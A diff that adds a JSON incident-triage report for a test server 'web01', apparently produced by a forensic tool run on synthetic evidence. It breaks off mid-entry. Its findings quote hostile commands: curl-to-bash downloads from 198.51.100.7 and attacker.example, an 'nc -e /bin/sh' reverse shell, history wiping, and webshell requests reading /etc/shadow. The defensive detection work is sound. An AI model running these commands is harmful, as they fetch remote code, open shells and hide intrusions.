@@ -1,0 +1,859 @@
+{
+  "case_name": "web01",
+  "created_at": "2026-04-28T04:31:50.687741+00:00",
+  "evidence_root": "/home/claude/test_evidence",
+  "host_info": {
+    "hostname": "web01.example.com",
+    "os_release": {
+      "NAME": "Ubuntu",
+      "VERSION": "22.04.3 LTS (Jammy Jellyfish)",
+      "ID": "ubuntu",
+      "ID_LIKE": "debian",
+      "PRETTY_NAME": "Ubuntu 22.04.3 LTS",
+      "VERSION_ID": "22.04",
+      "VERSION_CODENAME": "jammy"
+    },
+    "kernel": null,
+    "distro": "Ubuntu 22.04.3 LTS"
+  },
+  "stats": {
+    "host_metadata": {
+      "files": 3,
+      "events": 4,
+      "findings": 1,
+      "errors": []
+    },
+    "passwd_shadow_group": {
+      "files": 3,
+      "events": 12,
+      "findings": 7,
+      "errors": []
+    },
+    "ssh": {
+      "files": 3,
+      "events": 4,
+      "findings": 2,
+      "errors": []
+    },
+    "sudoers": {
+      "files": 2,
+      "events": 4,
+      "findings": 2,
+      "errors": []
+    },
+    "auth_log": {
+      "files": 1,
+      "events": 32,
+      "findings": 4,
+      "errors": []
+    },
+    "syslog": {
+      "files": 5,
+      "events": 34,
+      "findings": 13,
+      "errors": []
+    },
+    "wtmp_btmp": {
+      "files": 3,
+      "events": 13,
+      "findings": 0,
+      "errors": []
+    },
+    "lastlog": {
+      "files": 1,
+      "events": 4,
+      "findings": 2,
+      "errors": []
+    },
+    "history_files": {
+      "files": 2,
+      "events": 16,
+      "findings": 7,
+      "errors": []
+    },
+    "cron": {
+      "files": 3,
+      "events": 9,
+      "findings": 3,
+      "errors": []
+    },
+    "systemd": {
+      "files": 1,
+      "events": 1,
+      "findings": 2,
+      "errors": []
+    },
+    "audit": {
+      "files": 1,
+      "events": 6,
+      "findings": 4,
+      "errors": []
+    },
+    "package_logs": {
+      "files": 2,
+      "events": 12,
+      "findings": 4,
+      "errors": []
+    },
+    "web_logs": {
+      "files": 1,
+      "events": 12,
+      "findings": 7,
+      "errors": []
+    },
+    "persistence": {
+      "files": 4,
+      "events": 0,
+      "findings": 2,
+      "errors": []
+    }
+  },
+  "severity_counts": {
+    "MEDIUM": 10,
+    "HIGH": 47,
+    "CRITICAL": 3
+  },
+  "findings": [
+    {
+      "severity": "CRITICAL",
+      "category": "credential_access",
+      "title": "Account with empty password: bob",
+      "description": "Account 'bob' has an empty password hash and an interactive shell - login is possible without credentials.",
+      "artifact": "/home/claude/test_evidence/etc/shadow",
+      "evidence": [
+        "bob::19500:0:99999:7:::"
+      ],
+      "timestamp": "2026-04-27T10:54:37+00:00",
+      "metadata": {
+        "user": "bob"
+      }
+    },
+    {
+      "severity": "CRITICAL",
+      "category": "credential_access",
+      "title": "Direct root SSH login from 198.51.100.99",
+      "description": "Successful interactive root SSH login from 198.51.100.99 via publickey. Direct root logins should be disabled (PermitRootLogin no).",
+      "artifact": "/home/claude/test_evidence/var/log/auth.log",
+      "evidence": [
+        "Sep 12 05:01:00 web01 sshd[22000]: Accepted publickey for root from 198.51.100.99 port 51000 ssh2: RSA SHA256:XXXXXX"
+      ],
+      "timestamp": "2026-09-12T05:01:00+00:00",
+      "metadata": {
+        "user": "root",
+        "ip": "198.51.100.99",
+        "method": "publickey"
+      }
+    },
+    {
+      "severity": "CRITICAL",
+      "category": "privilege_escalation",
+      "title": "Non-root account with UID 0: toor",
+      "description": "Account 'toor' has UID 0 - it has full root privileges. Legitimate systems have exactly one UID 0 account named 'root'.",
+      "artifact": "/home/claude/test_evidence/etc/passwd",
+      "evidence": [
+        "toor:x:0:0:root backup:/root:/bin/bash"
+      ],
+      "timestamp": "2026-04-27T10:54:32+00:00",
+      "metadata": {
+        "user": "toor",
+        "uid": 0
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "account_management",
+      "title": "Service account 'backup' has interactive shell",
+      "description": "The system account 'backup' is configured with an interactive shell (/bin/bash). System accounts should have /usr/sbin/nologin or /bin/false.",
+      "artifact": "/home/claude/test_evidence/etc/passwd",
+      "evidence": [
+        "backup:x:34:34:backup:/var/backups:/bin/bash"
+      ],
+      "timestamp": "2026-04-27T10:54:32+00:00",
+      "metadata": {
+        "user": "backup",
+        "shell": "/bin/bash"
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "account_management",
+      "title": "Service account 'www-data' has interactive shell",
+      "description": "The system account 'www-data' is configured with an interactive shell (/bin/bash). System accounts should have /usr/sbin/nologin or /bin/false.",
+      "artifact": "/home/claude/test_evidence/etc/passwd",
+      "evidence": [
+        "www-data:x:33:33:www-data:/var/www:/bin/bash"
+      ],
+      "timestamp": "2026-04-27T10:54:32+00:00",
+      "metadata": {
+        "user": "www-data",
+        "shell": "/bin/bash"
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "anomaly",
+      "title": "Kernel anomaly: ANOM_PROMISCUOUS",
+      "description": "auditd recorded a kernel anomaly event (ANOM_PROMISCUOUS). These typically indicate crashes, abends, or promiscuous-mode interface changes.",
+      "artifact": "/home/claude/test_evidence/var/log/audit/audit.log",
+      "evidence": [
+        "type=ANOM_PROMISCUOUS msg=audit(1726113300.000:400): dev=eth0 prom=256 old_prom=0 auid=0 uid=0 gid=0 ses=4"
+      ],
+      "timestamp": "2024-09-12T03:55:00+00:00",
+      "metadata": {}
+    },
+    {
+      "severity": "HIGH",
+      "category": "credential_access",
+      "title": "SSH brute-force pattern from 192.0.2.55",
+      "description": "26 failed SSH authentications observed from 192.0.2.55 targeting 21 username(s).",
+      "artifact": "auth.log/secure",
+      "evidence": [
+        "users: admin, backup, demo, deploy, developer, docker, ftp, git, guest, info"
+      ],
+      "timestamp": null,
+      "metadata": {
+        "ip": "192.0.2.55",
+        "count": 26,
+        "users": [
+          "admin",
+          "backup",
+          "demo",
+          "deploy",
+          "developer",
+          "docker",
+          "ftp",
+          "git",
+          "guest",
+          "info",
+          "mail",
+          "mysql",
+          "nginx",
+          "oracle",
+          "pi",
+          "postgres",
+          "root",
+          "test",
+          "testing",
+          "user",
+          "www"
+        ]
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "credential_access",
+      "title": "Successful SSH login after 26 failures from 192.0.2.55",
+      "description": "User alice authenticated successfully from 192.0.2.55 after 26 failed attempts in the prior 10 minutes.",
+      "artifact": "auth.log/secure",
+      "evidence": [],
+      "timestamp": "2026-09-12T04:23:30+00:00",
+      "metadata": {
+        "ip": "192.0.2.55",
+        "user": "alice"
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "defense_evasion",
+      "title": "SELinux denial: sshd",
+      "description": "SELinux blocked process sshd (scontext=system_u:system_r:sshd_t:s0-s0:c0.c1023) accessing target context unconfined_u:object_r:user_home_t:s0.",
+      "artifact": "/home/claude/test_evidence/var/log/audit/audit.log",
+      "evidence": [
+        "type=AVC msg=audit(1726113200.111:300): avc:  denied  { execute } for  pid=2222 comm=\"sshd\" name=\"badbin\" dev=\"dm-0\" ino=12345 scontext=system_u:system_r:sshd_t:s0-s0:c0.c1023 tcontext=unconfined_u:object_r:user_home_t:s0 tclass=file"
+      ],
+      "timestamp": "2024-09-12T03:53:20.111000+00:00",
+      "metadata": {}
+    },
+    {
+      "severity": "HIGH",
+      "category": "defense_evasion",
+      "title": "Security package removed: auditd",
+      "description": "A security / monitoring package (auditd) was uninstalled. Confirm whether this matches an authorised change.",
+      "artifact": "/home/claude/test_evidence/var/log/dpkg.log",
+      "evidence": [],
+      "timestamp": "2025-09-12T04:30:21+00:00",
+      "metadata": {
+        "package": "auditd",
+        "action": "remove"
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "defense_evasion",
+      "title": "Security package removed: auditd",
+      "description": "A security / monitoring package (auditd) was uninstalled. Confirm whether this matches an authorised change.",
+      "artifact": "/home/claude/test_evidence/var/log/apt/history.log",
+      "evidence": [],
+      "timestamp": "2025-09-12T04:30:20+00:00",
+      "metadata": {
+        "package": "auditd",
+        "action": "remove"
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "defense_evasion",
+      "title": "Security package removed: fail2ban",
+      "description": "A security / monitoring package (fail2ban) was uninstalled. Confirm whether this matches an authorised change.",
+      "artifact": "/home/claude/test_evidence/var/log/dpkg.log",
+      "evidence": [],
+      "timestamp": "2025-09-12T04:30:30+00:00",
+      "metadata": {
+        "package": "fail2ban",
+        "action": "remove"
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "defense_evasion",
+      "title": "Security package removed: fail2ban",
+      "description": "A security / monitoring package (fail2ban) was uninstalled. Confirm whether this matches an authorised change.",
+      "artifact": "/home/claude/test_evidence/var/log/apt/history.log",
+      "evidence": [],
+      "timestamp": "2025-09-12T04:30:20+00:00",
+      "metadata": {
+        "package": "fail2ban",
+        "action": "remove"
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "execution",
+      "title": "Possible webshell access",
+      "description": "HTTP request from 198.51.100.99 contains tokens commonly associated with webshell command execution: 'cmd='.",
+      "artifact": "/home/claude/test_evidence/var/log/apache2/access.log",
+      "evidence": [
+        "198.51.100.99 - - [12/Sep/2025:04:30:11 +0000] \"GET /uploads/wso.php?cmd=id HTTP/1.1\" 200 543 \"-\" \"Mozilla/5.0\""
+      ],
+      "timestamp": "2025-09-12T04:30:11+00:00",
+      "metadata": {
+        "ip": "198.51.100.99",
+        "request": "GET /uploads/wso.php?cmd=id HTTP/1.1"
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "execution",
+      "title": "Possible webshell access",
+      "description": "HTTP request from 198.51.100.99 contains tokens commonly associated with webshell command execution: 'cmd='.",
+      "artifact": "/home/claude/test_evidence/var/log/apache2/access.log",
+      "evidence": [
+        "198.51.100.99 - - [12/Sep/2025:04:30:15 +0000] \"GET /uploads/wso.php?cmd=whoami HTTP/1.1\" 200 19 \"-\" \"Mozilla/5.0\""
+      ],
+      "timestamp": "2025-09-12T04:30:15+00:00",
+      "metadata": {
+        "ip": "198.51.100.99",
+        "request": "GET /uploads/wso.php?cmd=whoami HTTP/1.1"
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "execution",
+      "title": "Possible webshell access",
+      "description": "HTTP request from 198.51.100.99 contains tokens commonly associated with webshell command execution: 'cmd='.",
+      "artifact": "/home/claude/test_evidence/var/log/apache2/access.log",
+      "evidence": [
+        "198.51.100.99 - - [12/Sep/2025:04:30:30 +0000] \"GET /uploads/wso.php?cmd=cat+/etc/shadow HTTP/1.1\" 200 1029 \"-\" \"Mozilla/5.0\""
+      ],
+      "timestamp": "2025-09-12T04:30:30+00:00",
+      "metadata": {
+        "ip": "198.51.100.99",
+        "request": "GET /uploads/wso.php?cmd=cat+/etc/shadow HTTP/1.1"
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "execution",
+      "title": "Suspicious EXECVE in auditd",
+      "description": "auditd recorded an EXECVE containing tokens associated with attacker tradecraft: curl , | bash.",
+      "artifact": "/home/claude/test_evidence/var/log/audit/audit.log",
+      "evidence": [
+        "/bin/bash -c curl -s http://198.51.100.7/x.sh | bash"
+      ],
+      "timestamp": "2024-09-12T03:51:00.456000+00:00",
+      "metadata": {}
+    },
+    {
+      "severity": "HIGH",
+      "category": "execution",
+      "title": "Suspicious EXECVE in auditd",
+      "description": "auditd recorded an EXECVE containing tokens associated with attacker tradecraft: nc -e.",
+      "artifact": "/home/claude/test_evidence/var/log/audit/audit.log",
+      "evidence": [
+        "nc -e /bin/sh 198.51.100.7"
+      ],
+      "timestamp": "2024-09-12T03:52:00.789000+00:00",
+      "metadata": {}
+    },
+    {
+      "severity": "HIGH",
+      "category": "hardening",
+      "title": "PermitRootLogin = yes",
+      "description": "sshd is configured to allow root login. Industry best practice is 'no'. 'without-password' permits root via key.",
+      "artifact": "/home/claude/test_evidence/etc/ssh/sshd_config",
+      "evidence": [
+        "PermitRootLogin yes"
+      ],
+      "timestamp": "2026-04-27T10:55:06+00:00",
+      "metadata": {}
+    },
+    {
+      "severity": "HIGH",
+      "category": "hardening",
+      "title": "Root password SSH login enabled",
+      "description": "Both PermitRootLogin and PasswordAuthentication permit interactive root password authentication.",
+      "artifact": "/home/claude/test_evidence/etc/ssh/sshd_config",
+      "evidence": [],
+      "timestamp": "2026-04-27T10:55:06+00:00",
+      "metadata": {}
+    },
+    {
+      "severity": "HIGH",
+      "category": "hardware_anomaly",
+      "title": "USB mass-storage attach",
+      "description": "USB mass-storage device was attached. On servers this is anomalous and may indicate physical tampering or data exfiltration.",
+      "artifact": "/home/claude/test_evidence/var/log/messages",
+      "evidence": [
+        "Sep 12 03:14:02 web01 kernel: usb-storage 1-1:1.0: USB Mass Storage device detected"
+      ],
+      "timestamp": "2026-09-12T03:14:02+00:00",
+      "metadata": {}
+    },
+    {
+      "severity": "HIGH",
+      "category": "hardware_anomaly",
+      "title": "USB mass-storage attach",
+      "description": "USB mass-storage device was attached. On servers this is anomalous and may indicate physical tampering or data exfiltration.",
+      "artifact": "/home/claude/test_evidence/var/log/kern.log",
+      "evidence": [
+        "Sep 12 03:14:02 web01 kernel: [    1.345678] usb-storage 1-1:1.0: USB Mass Storage device detected"
+      ],
+      "timestamp": "2026-09-12T03:14:02+00:00",
+      "metadata": {}
+    },
+    {
+      "severity": "HIGH",
+      "category": "mac_denial",
+      "title": "AppArmor denial in syslog",
+      "description": "AppArmor denied an action - review the offending profile and the process being confined.",
+      "artifact": "/home/claude/test_evidence/var/log/messages",
+      "evidence": [
+        "Sep 12 05:01:00 web01 kernel: audit: type=1400 audit(1726113660.123:201): apparmor=\"DENIED\" operation=\"open\" profile=\"/usr/sbin/nginx\""
+      ],
+      "timestamp": "2026-09-12T05:01:00+00:00",
+      "metadata": {}
+    },
+    {
+      "severity": "HIGH",
+      "category": "mac_denial",
+      "title": "SELinux denial in syslog",
+      "description": "SELinux denied an action. Investigate whether the denial reflects mis-configuration or actual attempted boundary violation.",
+      "artifact": "/home/claude/test_evidence/var/log/kern.log",
+      "evidence": [
+        "Sep 12 04:00:00 web01 kernel: [ 5000.000] audit: type=1400 audit(1726113600.000:300): avc:  denied  { execute } for  pid=999 comm=\"bash\""
+      ],
+      "timestamp": "2026-09-12T04:00:00+00:00",
+      "metadata": {}
+    },
+    {
+      "severity": "HIGH",
+      "category": "persistence",
+      "title": "Sudoers grants www-data permission to modify sudoers",
+      "description": "www-data can modify the sudoers file itself - this is a complete privilege-escalation primitive.",
+      "artifact": "/home/claude/test_evidence/etc/sudoers.d/90-custom",
+      "evidence": [
+        "www-data ALL=(ALL) NOPASSWD: /usr/bin/visudo"
+      ],
+      "timestamp": "2026-04-27T10:55:18+00:00",
+      "metadata": {
+        "who": "www-data",
+        "host": "ALL",
+        "runas": "ALL",
+        "tags": "NOPASSWD:",
+        "commands": "/usr/bin/visudo",
+        "file": "/home/claude/test_evidence/etc/sudoers.d/90-custom"
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "persistence",
+      "title": "Suspicious ExecStart in systemd unit sysmaint.service",
+      "description": "A systemd unit's ExecStart line contains tokens associated with malicious automation: /tmp/..",
+      "artifact": "/home/claude/test_evidence/etc/systemd/system/sysmaint.service",
+      "evidence": [
+        "/tmp/.cache/helper --daemon"
+      ],
+      "timestamp": "2026-04-27T10:55:48+00:00",
+      "metadata": {
+        "name": "sysmaint.service",
+        "path": "/home/claude/test_evidence/etc/systemd/system/sysmaint.service",
+        "exec_start": [
+          "/tmp/.cache/helper --daemon"
+        ],
+        "exec_start_pre": [],
+        "user": "root",
+        "type": "simple",
+        "wantedby": [
+          "multi-user.target"
+        ],
+        "description": "System Maintenance Helper"
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "persistence",
+      "title": "Suspicious cron command for user 'alice'",
+      "description": "A scheduled cron command contains tokens commonly seen in malicious automation: | bash.",
+      "artifact": "/home/claude/test_evidence/var/spool/cron/crontabs/alice",
+      "evidence": [
+        "-qO- http://example.com/agent.sh | bash"
+      ],
+      "timestamp": "2026-04-27T10:55:45+00:00",
+      "metadata": {
+        "schedule": "@reboot",
+        "user": "alice",
+        "command": "-qO- http://example.com/agent.sh | bash",
+        "file": "/home/claude/test_evidence/var/spool/cron/crontabs/alice"
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "persistence",
+      "title": "Suspicious cron command for user 'root'",
+      "description": "A scheduled cron command contains tokens commonly seen in malicious automation: curl , | bash.",
+      "artifact": "/home/claude/test_evidence/etc/cron.d/sysmaint",
+      "evidence": [
+        "curl -s http://198.51.100.7/x.sh | bash"
+      ],
+      "timestamp": "2026-04-27T10:55:34+00:00",
+      "metadata": {
+        "schedule": "*/5 * * * *",
+        "user": "root",
+        "command": "curl -s http://198.51.100.7/x.sh | bash",
+        "file": "/home/claude/test_evidence/etc/cron.d/sysmaint"
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "persistence",
+      "title": "Suspicious cron command for user 'www-data'",
+      "description": "A scheduled cron command contains tokens commonly seen in malicious automation: /tmp/..",
+      "artifact": "/home/claude/test_evidence/etc/cron.d/sysmaint",
+      "evidence": [
+        "/tmp/.cache/agent"
+      ],
+      "timestamp": "2026-04-27T10:55:34+00:00",
+      "metadata": {
+        "schedule": "@reboot",
+        "user": "www-data",
+        "command": "/tmp/.cache/agent",
+        "file": "/home/claude/test_evidence/etc/cron.d/sysmaint"
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "persistence",
+      "title": "Suspicious tokens in global shell rc file",
+      "description": "Shell startup file 'utils.sh' contains tokens associated with attacker tradecraft: curl , | bash.",
+      "artifact": "/home/claude/test_evidence/etc/profile.d/utils.sh",
+      "evidence": [
+        "(curl -fsSL http://198.51.100.7/cb.sh | bash) >/dev/null 2>&1 &"
+      ],
+      "timestamp": "2026-04-27T10:56:47+00:00",
+      "metadata": {
+        "scope": "global",
+        "tokens": [
+          "curl ",
+          "| bash"
+        ]
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "persistence",
+      "title": "Suspicious tokens in global shell rc file",
+      "description": "Shell startup file 'utils.sh' contains tokens associated with attacker tradecraft: curl , | bash.",
+      "artifact": "/home/claude/test_evidence/etc/profile.d/utils.sh",
+      "evidence": [
+        "(curl -fsSL http://198.51.100.7/cb.sh | bash) >/dev/null 2>&1 &"
+      ],
+      "timestamp": "2026-04-27T10:56:47+00:00",
+      "metadata": {
+        "scope": "global",
+        "tokens": [
+          "curl ",
+          "| bash"
+        ]
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "persistence",
+      "title": "systemd unit sysmaint.service runs binary from world-writable location",
+      "description": "ExecStart for unit 'sysmaint.service' references a path in /tmp, /var/tmp or /dev/shm. Legitimate services should live under /usr/bin, /usr/local/bin, /opt, etc.",
+      "artifact": "/home/claude/test_evidence/etc/systemd/system/sysmaint.service",
+      "evidence": [
+        "/tmp/.cache/helper --daemon"
+      ],
+      "timestamp": "2026-04-27T10:55:48+00:00",
+      "metadata": {
+        "name": "sysmaint.service",
+        "path": "/home/claude/test_evidence/etc/systemd/system/sysmaint.service",
+        "exec_start": [
+          "/tmp/.cache/helper --daemon"
+        ],
+        "exec_start_pre": [],
+        "user": "root",
+        "type": "simple",
+        "wantedby": [
+          "multi-user.target"
+        ],
+        "description": "System Maintenance Helper"
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "privilege_escalation",
+      "title": "Members of privileged group 'sudo'",
+      "description": "Group 'sudo' has the following members: alice. Verify each is authorised.",
+      "artifact": "/home/claude/test_evidence/etc/group",
+      "evidence": [
+        "sudo:x:27:alice"
+      ],
+      "timestamp": "2026-04-27T10:54:41+00:00",
+      "metadata": {
+        "group": "sudo",
+        "members": [
+          "alice"
+        ]
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "privilege_escalation",
+      "title": "NOPASSWD: ALL granted to alice",
+      "description": "alice can run any command as ALL without a password.",
+      "artifact": "/home/claude/test_evidence/etc/sudoers.d/90-custom",
+      "evidence": [
+        "alice ALL=(ALL) NOPASSWD: ALL"
+      ],
+      "timestamp": "2026-04-27T10:55:18+00:00",
+      "metadata": {
+        "who": "alice",
+        "host": "ALL",
+        "runas": "ALL",
+        "tags": "NOPASSWD:",
+        "commands": "ALL",
+        "file": "/home/claude/test_evidence/etc/sudoers.d/90-custom"
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "reconnaissance",
+      "title": "Scanner user-agent observed: sqlmap",
+      "description": "A request from 198.51.100.55 carried a User-Agent matching the offensive tool 'sqlmap'.",
+      "artifact": "/home/claude/test_evidence/var/log/apache2/access.log",
+      "evidence": [
+        "198.51.100.55 - - [12/Sep/2025:04:00:01 +0000] \"GET / HTTP/1.1\" 200 1543 \"-\" \"sqlmap/1.7.2#stable (https://sqlmap.org)\""
+      ],
+      "timestamp": "2025-09-12T04:00:01+00:00",
+      "metadata": {
+        "ip": "198.51.100.55",
+        "ua": "sqlmap/1.7.2#stable (https://sqlmap.org)"
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "reconnaissance",
+      "title": "Scanner user-agent observed: sqlmap",
+      "description": "A request from 198.51.100.55 carried a User-Agent matching the offensive tool 'sqlmap'.",
+      "artifact": "/home/claude/test_evidence/var/log/apache2/access.log",
+      "evidence": [
+        "198.51.100.55 - - [12/Sep/2025:04:00:02 +0000] \"GET /index.php?id=1' HTTP/1.1\" 500 245 \"-\" \"sqlmap/1.7.2#stable\""
+      ],
+      "timestamp": "2025-09-12T04:00:02+00:00",
+      "metadata": {
+        "ip": "198.51.100.55",
+        "ua": "sqlmap/1.7.2#stable"
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "reconnaissance",
+      "title": "Scanner user-agent observed: sqlmap",
+      "description": "A request from 198.51.100.55 carried a User-Agent matching the offensive tool 'sqlmap'.",
+      "artifact": "/home/claude/test_evidence/var/log/apache2/access.log",
+      "evidence": [
+        "198.51.100.55 - - [12/Sep/2025:04:00:03 +0000] \"GET /admin/../../etc/passwd HTTP/1.1\" 404 162 \"-\" \"sqlmap/1.7.2#stable\""
+      ],
+      "timestamp": "2025-09-12T04:00:03+00:00",
+      "metadata": {
+        "ip": "198.51.100.55",
+        "ua": "sqlmap/1.7.2#stable"
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "resource_anomaly",
+      "title": "OOM killer activity",
+      "description": "Kernel out-of-memory killer activity recorded. Common during memory-exhaustion DoS, runaway miners, or fork-bomb behaviour.",
+      "artifact": "/home/claude/test_evidence/var/log/messages",
+      "evidence": [
+        "Sep 12 03:20:11 web01 kernel: Out of memory: Killed process 12345 (xmrig) total-vm:2097152kB"
+      ],
+      "timestamp": "2026-09-12T03:20:11+00:00",
+      "metadata": {}
+    },
+    {
+      "severity": "HIGH",
+      "category": "resource_anomaly",
+      "title": "OOM killer activity",
+      "description": "Kernel out-of-memory killer activity recorded. Common during memory-exhaustion DoS, runaway miners, or fork-bomb behaviour.",
+      "artifact": "/home/claude/test_evidence/var/log/messages",
+      "evidence": [
+        "Sep 12 03:20:12 web01 kernel: oom-killer: gfp_mask=0x100cca(GFP_HIGHUSER_MOVABLE)"
+      ],
+      "timestamp": "2026-09-12T03:20:12+00:00",
+      "metadata": {}
+    },
+    {
+      "severity": "HIGH",
+      "category": "resource_anomaly",
+      "title": "OOM killer activity",
+      "description": "Kernel out-of-memory killer activity recorded. Common during memory-exhaustion DoS, runaway miners, or fork-bomb behaviour.",
+      "artifact": "/home/claude/test_evidence/var/log/kern.log",
+      "evidence": [
+        "Sep 12 03:20:11 web01 kernel: [ 4567.890] Out of memory: Killed process 12345 (xmrig)"
+      ],
+      "timestamp": "2026-09-12T03:20:11+00:00",
+      "metadata": {}
+    },
+    {
+      "severity": "HIGH",
+      "category": "suspicious_command",
+      "title": "Suspicious command in claude history",
+      "description": "Command executed by 'claude' contains tokens associated with attacker tradecraft: wget ",
+      "artifact": "/home/claude/test_evidence/root/.bash_history",
+      "evidence": [
+        "wget http://198.51.100.7/x -O agent"
+      ],
+      "timestamp": "2026-04-27T10:55:55+00:00",
+      "metadata": {
+        "user": "claude",
+        "tokens": [
+          "wget "
+        ]
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "suspicious_command",
+      "title": "Suspicious command in claude history",
+      "description": "Command executed by 'claude' contains tokens associated with attacker tradecraft: curl , | bash",
+      "artifact": "/home/claude/test_evidence/root/.bash_history",
+      "evidence": [
+        "curl -s http://attacker.example/payload.sh | bash"
+      ],
+      "timestamp": "2026-04-27T10:55:55+00:00",
+      "metadata": {
+        "user": "claude",
+        "tokens": [
+          "curl ",
+          "| bash"
+        ]
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "suspicious_command",
+      "title": "Suspicious command in claude history",
+      "description": "Command executed by 'claude' contains tokens associated with attacker tradecraft: nc -e",
+      "artifact": "/home/claude/test_evidence/root/.bash_history",
+      "evidence": [
+        "nc -e /bin/sh 198.51.100.7 4444"
+      ],
+      "timestamp": "2026-04-27T10:55:55+00:00",
+      "metadata": {
+        "user": "claude",
+        "tokens": [
+          "nc -e"
+        ]
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "suspicious_command",
+      "title": "Suspicious command in claude history",
+      "description": "Command executed by 'claude' contains tokens associated with attacker tradecraft: unset histfile",
+      "artifact": "/home/claude/test_evidence/root/.bash_history",
+      "evidence": [
+        "unset HISTFILE"
+      ],
+      "timestamp": "2026-04-27T10:55:55+00:00",
+      "metadata": {
+        "user": "claude",
+        "tokens": [
+          "unset histfile"
+        ]
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "suspicious_command",
+      "title": "Suspicious command in claude history",
+      "description": "Command executed by 'claude' contains tokens associated with attacker tradecraft: history -c",
+      "artifact": "/home/claude/test_evidence/root/.bash_history",
+      "evidence": [
+        "history -c"
+      ],
+      "timestamp": "2026-04-27T10:55:55+00:00",
+      "metadata": {
+        "user": "claude",
+        "tokens": [
+          "history -c"
+        ]
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "suspicious_command",
+      "title": "Suspicious tokens in cron (CROND)",
+      "description": "Log line contains tokens commonly seen in attacker tradecraft: curl , | bash.",
+      "artifact": "/home/claude/test_evidence/var/log/cron",
+      "evidence": [
+        "Sep 12 04:30:01 web01 CROND[2000]: (root) CMD (curl -s http://198.51.100.7/x.sh | bash)"
+      ],
+      "timestamp": "2026-09-12T04:30:01+00:00",
+      "metadata": {
+        "program": "CROND",
+        "tokens": [
+          "curl ",
+          "| bash"
+        ]
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "suspicious_command",
+      "title": "Suspicious tokens in kern.log (kernel)",
+      "description": "Log line contains tokens commonly seen in attacker tradecraft: xmrig.",
+      "artifact": "/home/claude/test_evidence/var/log/kern.log",
+      "evidence": [
+        "Sep 12 03:20:11 web01 kernel: [ 4567.890] Out of memory: Killed process 12345 (xmrig)"
+      ],
+      "timestamp": "2026-09-12T03:20:11+00:00",
+      "metadata": {
+        "program": "kernel",
+        "tokens": [
+          "xmrig"
+        ]
+      }
+    },
+    {
+      "severity": "HIGH",
+      "category": "suspicious_command",
+      "title": "Suspicious tokens in messages (cron)",
+      "description": "Log line contains tokens commonly seen in attacker tradecraft: curl , | bash.",
+      "artifact": "/home/claude/test_evidence/var/log/messages",
+      "evidence": [
+        "Sep 12
